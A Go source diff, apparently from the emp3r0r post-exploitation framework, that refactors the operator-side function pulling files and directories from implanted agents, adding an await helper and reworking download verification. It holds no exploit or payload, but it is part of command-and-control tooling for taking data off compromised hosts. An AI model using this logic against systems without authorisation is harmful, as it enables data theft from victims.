@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"strconv"
 	"strings"
-	"time"
 
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
@@ -27,9 +26,10 @@ func UploadToAgent(src, dst string, target *def.Emp3r0rAgent) error {
 	return PutFile(src, dst, target)
 }
 
-// DownloadFromAgent downloads a file or directory from an agent.
-// If isRecursive is true, downloads all files matching the filter regex.
-// Returns error if download fails.
+// DownloadFromAgent is the legacy download path for agents that cannot run the
+// get_file BOF (Windows agents, and Linux agents whose binary is not x86-64).
+// It drives the agent's built-in `get` command; Linux x86-64 agents use the
+// module-backed path in the modules package instead.
 func DownloadFromAgent(target *def.Emp3r0rAgent, filePath string, isRecursive bool, filter string) error {
 	if target == nil {
 		return fmt.Errorf("no target agent selected")
@@ -39,57 +39,31 @@ func DownloadFromAgent(target *def.Emp3r0rAgent, filePath string, isRecursive bo
 	}
 
 	if isRecursive {
-		job_id := uuid.NewString()
-		cmd_str := fmt.Sprintf("get --file_path %s --filter %s --offset 0 --token %s",
+		cmdStr := fmt.Sprintf("get --file_path %s --filter %s --offset 0 --token %s",
 			strconv.Quote(filePath), strconv.Quote(filter), strconv.Quote(uuid.NewString()))
-		err := ExecCmd(cmd_str, job_id, target.Tag)
-		if err != nil {
-			return fmt.Errorf("cannot get file list: %v", err)
-		}
 
+		// A directory is never uploaded: the agent prints the matching paths as
+		// the command result.
 		logging.Infof("Waiting for response from agent %s", target.Tag)
-		var result string
-		for i := 0; i < 10; i++ {
-			res, ok := live.CmdResultString(job_id)
-			if ok {
-				result = res
-				logging.Infof("Got file list from %s", target.Tag)
-				live.CmdResults.Delete(job_id)
-				if result == "" {
-					return fmt.Errorf("empty file list in directory: %s", filePath)
-				}
-				break
-			}
-			time.Sleep(1 * time.Second)
+		jobID := uuid.NewString()
+		res, err := live.AwaitCmdResult(jobID, live.AgentReplyTimeout(), func() error {
+			return ExecCmd(cmdStr, jobID, target.Tag)
+		})
+		if err != nil {
+			return fmt.Errorf("cannot get file list: %w", err)
 		}
-		result = util.SanitizeText(result)
+		logging.Infof("Got file list from %s", target.Tag)
+		if res == "" {
+			return fmt.Errorf("empty file list in directory: %s", filePath)
+		}
+		result := util.SanitizeText(res)
 		logging.Debugf("Got file list: %s", result)
 
-		// download files
 		files := strings.Split(result, "\n")
-		failed_files := []string{}
-		defer func() {
-			logging.Infof("Checking %d downloads...", len(files))
-			// check if downloads are successful
-			for _, file := range files {
-				// filenames
-				_, target_file, tempname, lock := GenerateGetFilePaths(file)
-				// check if download is successful
-				if util.IsFileExist(tempname) || util.IsFileExist(lock) || !util.IsFileExist(target_file) {
-					logging.Warningf("%s: download seems unsuccessful", file)
-					failed_files = append(failed_files, file)
-				}
-			}
-			if len(failed_files) > 0 {
-				logging.Errorf("Failed to download %d files: %s", len(failed_files), strings.Join(failed_files, ", "))
-			} else {
-				logging.Successf("All %d files downloaded successfully", len(files))
-			}
-		}()
 
 		logging.Infof("Downloading %d files", len(files))
 		for n, file := range files {
-			ftpSh, err := GetFile(file, target)
+			ftpSh, err := getFile(file, target)
 			if err != nil {
 				logging.Warningf("Cannot get %s: %v", file, err)
 				continue
@@ -97,8 +71,8 @@ func DownloadFromAgent(target *def.Emp3r0rAgent, filePath string, isRecursive bo
 
 			logging.Infof("Downloading %d/%d: %s", n+1, len(files), file)
 
-			// wait for file to be downloaded
-			for {
+			// A nil stream means the local copy was already complete.
+			for ftpSh != nil {
 				if val, ok := network.FTPStreams.Load(file); ok {
 					if sh, ok := val.(*network.StreamHandler); ok && sh != nil && ftpSh.Token == sh.Token {
 						util.TakeABlink()
@@ -109,12 +83,35 @@ func DownloadFromAgent(target *def.Emp3r0rAgent, filePath string, isRecursive bo
 			}
 		}
 
-		if len(failed_files) > 0 {
-			return fmt.Errorf("failed to download %d files", len(failed_files))
+		var failedFiles []string
+		logging.Infof("Checking %d downloads...", len(files))
+		for _, file := range files {
+			_, targetFile, tempname, lock := GenerateGetFilePaths(file)
+			if util.IsFileExist(tempname) || util.IsFileExist(lock) || !util.IsFileExist(targetFile) {
+				logging.Warningf("%s: download seems unsuccessful", file)
+				failedFiles = append(failedFiles, file)
+			}
 		}
+		if len(failedFiles) > 0 {
+			logging.Errorf("Failed to download %d files: %s", len(failedFiles), strings.Join(failedFiles, ", "))
+			return fmt.Errorf("failed to download %d files", len(failedFiles))
+		}
+		logging.Successf("All %d files downloaded successfully", len(files))
 		return nil
-	} else {
-		_, err := GetFile(filePath, target)
+	}
+
+	ftpSh, err := getFile(filePath, target)
+	if err != nil {
 		return err
 	}
+	for ftpSh != nil {
+		if val, ok := network.FTPStreams.Load(filePath); ok {
+			if sh, ok := val.(*network.StreamHandler); ok && sh != nil && ftpSh.Token == sh.Token {
+				util.TakeABlink()
+				continue
+			}
+		}
+		break
+	}
+	return nil
 }
